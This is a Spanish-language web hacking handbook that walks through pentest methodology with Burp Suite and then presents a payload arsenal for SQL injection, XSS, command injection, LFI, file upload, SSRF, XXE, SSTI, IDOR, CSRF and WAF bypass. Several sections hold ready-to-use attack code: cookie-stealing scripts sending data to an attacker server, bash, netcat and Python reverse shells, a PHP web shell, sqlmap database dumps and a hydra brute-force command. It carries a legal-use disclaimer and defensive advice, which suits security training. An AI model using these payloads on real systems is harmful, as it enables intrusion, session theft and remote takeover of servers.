# 🕸️ LIBRO DE HACKING WEB
> Las webs son el blanco #1 del mundo. Aquí aprendes a romperlas (legalmente) y a protegerlas.
> Versión 2.0 — BUFFEADO: payloads reales, bypasses y metodología pro. Úsalo con Burp Suite (`burp`).

---

## ⚠️ Recordatorio (léelo cada vez)
Todo esto se practica SOLO en: tu propio lab, **DVWA**, **PortSwigger Web Security Academy** (gratis y legal), **OWASP Juice Shop**, HackTheBox, o un cliente con **permiso escrito**. Atacar una web ajena sin permiso es **delito** (CFAA / Código Penal). Estos payloads son para aprender a **encontrar y arreglar** fallos — del lado correcto.

---

## 1. Cómo funciona una aplicación web (lo que atacas)

```
[Tu navegador] ⟷ HTTP/HTTPS ⟷ [Servidor web] ⟷ [Base de datos]
   Frontend          red          Backend         Datos
   HTML/JS/CSS                  PHP/Python/Node    MySQL/etc
```

- **Frontend:** lo que ves (HTML, CSS, JS). Corre en TU navegador. **Nunca confíes en validaciones que solo están aquí** — se saltan trivialmente (desactiva JS, edita la petición en Burp).
- **Backend:** la lógica en el servidor. Aquí debe estar la seguridad REAL.
- **Base de datos:** usuarios, contraseñas, datos. El premio gordo.

**La regla de oro:** *toda entrada del usuario es peligrosa hasta que se demuestre lo contrario.* Cada parámetro, header, cookie, campo y parte de la URL es un punto de inyección potencial. Tu trabajo es probar TODOS.

**Dónde inyectar (no olvides ninguno):**
- Parámetros GET (`?id=1`) y POST (body)
- Headers: `User-Agent`, `Referer`, `X-Forwarded-For`, `Host`, `Cookie`
- Valores JSON / XML en APIs
- Nombres de archivo en uploads
- Cualquier dato que la app refleje o procese

---

## 2. Tu arma principal: Burp Suite

Burp es un **proxy** entre tu navegador y la web: ves y modificas **TODO** el tráfico.

### Setup rápido
1. `burp` → "Temporary project" → "Use Burp defaults".
2. **Proxy → Open Browser** (navegador integrado, ya proxeado — lo más fácil).
3. Para HTTPS con tu navegador normal: proxy `127.0.0.1:8080` + instala el cert (visita `http://burp`).

### Las pestañas clave
- **Proxy → HTTP history:** todo lo que pasó. Oro puro.
- **Repeater** (Ctrl+R): reenvía y modifica una petición mil veces. **Tu herramienta #1.**
- **Intruder:** automatiza ataques (fuzzing, fuerza bruta, enumeración).
- **Decoder / Inspector:** codifica/decodifica URL, Base64, hex, HTML.
- **Comparer:** compara dos respuestas (clave en blind injection).

### Extensiones que valen oro (BApp Store)
- **Logger++** — registro avanzado de todas las peticiones
- **Autorize** — detecta IDOR / fallos de autorización automáticamente
- **Param Miner** — descubre parámetros y headers ocultos
- **Turbo Intruder** — fuzzing ultrarrápido
- **JSON Web Tokens (JWT)** — manipular tokens JWT
- **Active Scan++** — mejora el escáner

> **OWASP ZAP** (también lo tienes) hace lo mismo, gratis y open source.

---

## 3. Metodología de un pentest web (el orden que funciona)

### Fase 1 — Reconocimiento
```bash
whatweb http://objetivo                 # tecnologías (CMS, framework, lenguaje)
nmap -sV -p80,443,8080,8443 objetivo    # servicios web
curl -sI http://objetivo                # headers (Server, X-Powered-By)
```
Mira el código fuente (Ctrl+U), comentarios, `robots.txt`, `sitemap.xml`, `/.git/`, `/.env`.

### Fase 2 — Descubrir contenido oculto (fuzzing de directorios)
```bash
gobuster dir -u http://objetivo -w /usr/share/wordlists/dirb/common.txt -x php,txt,bak,zip
ffuf -u http://objetivo/FUZZ -w wordlist.txt -mc 200,301,302,403 -e .php,.bak,.old
feroxbuster -u http://objetivo --depth 2          # recursivo automático
```
Busca: `/admin`, `/backup`, `/api`, `/.git`, `/config`, `/test`, `.bak`, `.old`, `.zip`.

### Fase 3 — Escaneo automático
```bash
nikto -h http://objetivo                # problemas conocidos
nuclei -u http://objetivo -severity medium,high,critical    # plantillas CVE
```

### Fase 4 — Explotación manual con Burp
Captura las peticiones interesantes → Repeater → prueba cada inyección. **Aquí está abajo el arsenal de payloads.**

### Fase 5 — Documentar
Cada hallazgo: qué es, cómo reproducirlo (paso a paso), el impacto, y cómo arreglarlo. El **reporte** es el producto final del pentester.

---

# 🔫 ARSENAL DE PAYLOADS

> Esta es la parte "PayloadsAllTheThings". Payloads listos para detectar y explotar. Pruébalos en orden: primero detectar, luego explotar.

## 4. Inyección SQL (SQLi)

**Qué es:** meter SQL en un campo para manipular la base de datos.

### Detección (¿es vulnerable?)
```sql
'                          → si rompe/da error, posible SQLi
''
`
"
1' AND '1'='1              → verdadero (página normal)
1' AND '1'='2              → falso (página cambia) = ¡vulnerable!
1 AND 1=1
1 AND 1=2
```

### Bypass de login (autenticación)
```sql
admin' --
admin' #
admin'/*
' OR '1'='1
' OR '1'='1' --
' OR 1=1 --
admin' OR '1'='1' #
') OR ('1'='1
```

### UNION-based (extraer datos)
```sql
' ORDER BY 1--          (sube el número hasta que dé error = nº de columnas)
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT user(),database()--
' UNION SELECT table_name,NULL FROM information_schema.tables--
' UNION SELECT username,password FROM users--
```

### Blind (a ciegas, por booleano o tiempo)
```sql
' AND 1=1--                      (booleano: verdadero)
' AND 1=2--                      (booleano: falso)
' AND SLEEP(5)--                 (MySQL: si tarda 5s, vulnerable)
'; WAITFOR DELAY '0:0:5'--       (MSSQL)
' AND pg_sleep(5)--              (PostgreSQL)
```

### Automatización con sqlmap (ya lo tienes)
```bash
sqlmap -u "http://objetivo/item?id=1" --batch --dbs              # bases de datos
sqlmap -u "http://objetivo/item?id=1" -D tienda --tables         # tablas
sqlmap -u "http://objetivo/item?id=1" -D tienda -T users --dump  # ¡volcar usuarios!
sqlmap -r peticion.txt --batch --dump                            # desde una petición guardada de Burp
sqlmap -u "..." --os-shell                                       # shell en el servidor (si se puede)
```

### Bypass de filtros/WAF
```sql
'/**/OR/**/1=1--          (comentarios en vez de espacios)
'%09OR%091=1--            (tabs URL-encoded)
' OR 1=1#                 (# en vez de --)
'+OR+'1'='1               (+ como espacio)
admin'/**/--              (comentario inline)
UnIoN SeLeCt              (mezclar mayúsculas si filtra "union select")
UNIONUNION SELECTSELECT   (palabra doble si elimina una vez)
```

**Defensa:** consultas parametrizadas (prepared statements) SIEMPRE. ORM. Validar entrada. Mínimo privilegio en la BD. WAF como capa extra, nunca como única.

---

## 5. Cross-Site Scripting (XSS)

**Qué es:** inyectar JavaScript que se ejecuta en el navegador de OTROS usuarios.

**Tipos:** Reflejado (en la URL), Almacenado (guardado en BD, el peor), DOM-based (en el JS del cliente).

### Detección
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
"><script>alert(1)</script>
'><script>alert(1)</script>
javascript:alert(1)
<svg onload=alert(1)>
```

### Bypass de filtros (cuando bloquea `<script>`)
```html
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
<body onload=alert(1)>
<iframe src="javascript:alert(1)">
<input autofocus onfocus=alert(1)>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<a href="javascript:alert(1)">click</a>
<img src=x onerror="alert`1`">           (backticks en vez de paréntesis)
<scr<script>ipt>alert(1)</scr</script>ipt>   (etiqueta anidada)
```

### Polyglot (funciona en muchos contextos)
```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/onload=alert()//>\x3e
```

### Explotación real (robar la sesión)
```html
<script>fetch('https://TU-SERVIDOR/?c='+document.cookie)</script>
<script>new Image().src='https://TU-SERVIDOR/?c='+document.cookie</script>
```
(Montas un listener con `nc -lvnp 80` o un webhook para recibir la cookie.)

**Defensa:** escapar/sanitizar TODA salida según el contexto (HTML, atributo, JS, URL). **Content-Security-Policy (CSP).** Cookies con `HttpOnly` (el JS no las lee) + `Secure` + `SameSite`.

---

## 6. Command Injection (ejecución de comandos)

**Qué es:** la app pasa tu entrada a un comando del sistema → ejecutas comandos en el servidor.

### Detección y explotación
```bash
; id
| id
|| id
& id
&& id
` id `
$(id)
%0a id              (salto de línea)
; ping -c 4 TU-IP   (si recibes pings, hay ejecución ciega)
```

### Bypass de filtros
```bash
;l''s              (comillas en medio)
;l\s               (backslash)
;cat${IFS}/etc/passwd     (${IFS} = espacio)
;cat</etc/passwd
;/bin/c'a't /etc/passwd
```

### Reverse shell (cuando confirmas ejecución)
```bash
; bash -i >& /dev/tcp/TU-IP/4444 0>&1
; nc -e /bin/bash TU-IP 4444
; python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("TU-IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh"])'
```
(Recibes con `nc -lvnp 4444`. **Solo en TU lab.**)

**Defensa:** NUNCA pasar entrada del usuario a comandos del sistema. Usar APIs/librerías nativas. Si es inevitable, listas blancas estrictas y escaping.

---

## 7. Path Traversal & LFI/RFI (leer archivos del servidor)

**Qué es:** salir del directorio permitido para leer archivos del sistema (LFI) o incluir archivos remotos (RFI).

### Path traversal / LFI
```
../../../../etc/passwd
....//....//....//etc/passwd        (bypass de filtro que quita ../ una vez)
..%2f..%2f..%2fetc%2fpasswd         (URL-encoded)
/etc/passwd%00                      (null byte, en sistemas viejos)
....\\....\\....\\windows\win.ini   (Windows)
```

### Wrappers PHP (LFI a RCE)
```
php://filter/convert.base64-encode/resource=index.php    (leer código fuente)
php://filter/read=string.rot13/resource=config.php
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+   (ejecutar código)
expect://id
```

### Archivos jugosos para leer
```
/etc/passwd            /etc/shadow         /etc/hosts
/var/log/apache2/access.log    (log poisoning → RCE)
/proc/self/environ
~/.ssh/id_rsa          ~/.bash_history
config.php  wp-config.php  .env  settings.py
```

**Defensa:** nunca usar entrada del usuario en rutas de archivo. Listas blancas. `basename()`. Deshabilitar `allow_url_include`.

---

## 8. File Upload (subir una web shell)

**Qué es:** subir un archivo malicioso (ej. una web shell PHP) cuando la validación es débil.

### Web shell mínima (PHP)
```php
<?php system($_GET['cmd']); ?>
```
Luego la llamas: `http://objetivo/uploads/shell.php?cmd=id`

### Bypass de validación de extensión
```
shell.php          → si bloquea, prueba:
shell.phtml  shell.php3  shell.php4  shell.php5  shell.phar
shell.pHp          (mayúsculas mezcladas)
shell.php.jpg      (doble extensión)
shell.php%00.jpg   (null byte)
shell.jpg + cambiar Content-Type a image/jpeg en Burp
```
- **Magic bytes:** añade `GIF89a;` al inicio del archivo para pasar como imagen
- Si valida `Content-Type`, cámbialo en Burp a `image/png`

**Defensa:** lista blanca de extensiones, validar contenido real (no solo extensión), renombrar archivos, guardarlos fuera del webroot, sin permisos de ejecución.

---

## 9. SSRF (Server-Side Request Forgery)

**Qué es:** hacer que el SERVIDOR haga peticiones por ti, alcanzando lo interno que tú no ves.

### Payloads
```
http://localhost/admin
http://127.0.0.1:8080
http://169.254.169.254/latest/meta-data/        (AWS cloud metadata — robar credenciales)
http://metadata.google.internal/                 (GCP)
file:///etc/passwd
http://127.0.0.1:6379                             (Redis interno)
```

### Bypass de filtros
```
http://127.0.0.1   →   http://127.1   http://0177.0.0.1   http://2130706433   (decimal)
http://localhost   →   http://[::1]   http://0.0.0.0
http://burpcollaborator.net   (para confirmar SSRF ciego)
```

**Defensa:** lista blanca de destinos, bloquear IPs internas/metadata, no seguir redirecciones, deshabilitar protocolos peligrosos (`file://`, `gopher://`).

---

## 10. XXE (XML External Entity)

**Qué es:** cuando la app procesa XML, inyectar entidades para leer archivos o hacer SSRF.

### Payload (leer /etc/passwd)
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
```

### XXE para SSRF
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/">]>
<foo>&xxe;</foo>
```

**Defensa:** deshabilitar entidades externas y DTDs en el parser XML. Usar JSON si es posible.

---

## 11. SSTI (Server-Side Template Injection)

**Qué es:** inyectar en un motor de plantillas (Jinja2, Twig, etc.) → puede llevar a RCE.

### Detección
```
${7*7}        {{7*7}}        <%= 7*7 %>        #{7*7}
```
Si ves `49`, hay SSTI.

### Explotación (Jinja2 / Python → RCE)
```
{{config}}
{{''.__class__.__mro__[1].__subclasses__()}}
{{cycler.__init__.__globals__.os.popen('id').read()}}
```

**Defensa:** no pasar entrada del usuario a plantillas. Sandbox del motor. Usar plantillas lógicas, no de string.

---

## 12. IDOR & fallos de autorización

**Qué es:** acceder a datos ajenos cambiando un identificador.

```
GET /perfil?id=1001   →   cambia a id=1002, id=1000...
GET /api/user/123     →   /api/user/124
GET /factura/00045    →   /factura/00046
```
Prueba también: cambiar tu rol en el body (`"role":"user"` → `"role":"admin"`), IDs en cookies/JWT.
**Tip:** la extensión **Autorize** de Burp lo detecta automático.

**Defensa:** verificar autorización en CADA petición del lado servidor (¿este usuario puede ver/editar ESTE recurso?).

---

## 13. CSRF & Autenticación rota

**CSRF:** engañar al navegador de una víctima logueada para que ejecute una acción.
```html
<img src="http://banco.com/transferir?a=atacante&monto=1000">
<form action="http://banco.com/cambiar-pass" method="POST">
  <input name="password" value="hackeado123"></form><script>document.forms[0].submit()</script>
```
**Defensa:** tokens CSRF únicos por formulario + cookies `SameSite=Strict`.

**Auth rota:** fuerza bruta de login, credential stuffing, sesiones predecibles.
```bash
hydra -l admin -P /opt/wordlists/rockyou.txt objetivo http-post-form "/login:user=^USER^&pass=^PASS^:incorrecta"
```
O el **Intruder** de Burp. **Defensa:** 2FA, límite de intentos, bcrypt/argon2, tokens de sesión aleatorios.

---

## 14. Bypass de WAF (técnicas generales)

Cuando un Web Application Firewall bloquea tus payloads:
- **Codificación:** URL-encode, doble URL-encode, Unicode, HTML entities
- **Comentarios:** `/**/` en SQL, `<!-- -->` 
- **Mayúsculas mezcladas:** `SeLeCt`, `ScRiPt`
- **Espacios alternativos:** tabs (`%09`), saltos de línea (`%0a`), `${IFS}`, `/**/`, `+`
- **Doble palabra:** `UNIONUNION` (si quita "UNION" una vez)
- **Fragmentación:** dividir el payload entre varios parámetros
- **Cambiar el método:** GET ↔ POST, JSON ↔ form-data

---

## 15. Tu laboratorio (practica TODO esto legalmente)

**DVWA con Docker:**
```bash
docker run --rm -it -p 8080:80 vulnerables/web-dvwa
# http://localhost:8080 — admin / password
```

Otros (gratis):
- **PortSwigger Web Security Academy** — el MEJOR, labs guiados de CADA vulnerabilidad de este libro
- **OWASP Juice Shop** — web moderna vulnerable (JS)
- **bWAPP, WebGoat, HackTheBox**

**Plan:** DVWA en "Low" → practica cada payload de arriba con Burp → sube a "Medium" → "High". En semanas dominas el OWASP Top 10 con tus propias manos.

---

## 🎓 Para seguir
- **PortSwigger Web Security Academy** — termínala, es oro y gratis.
- **PayloadsAllTheThings** (github.com/swisskyrepo/PayloadsAllTheThings) — la referencia mundial de payloads, ten el repo a mano.
- **Bug bounty:** HackerOne / Bugcrowd **pagan** por encontrar bugs reales, legalmente.
- **Sigue con:** `~/libro-redes.md`, `~/libro-python-hacking.md` (automatiza tus ataques) y `~/libro-ciberseguridad.md`.

> ⬛ *Cada campo de texto es una pregunta del servidor. Aprende a responder con algo que no esperaba — y luego enseña a cerrarlo.*
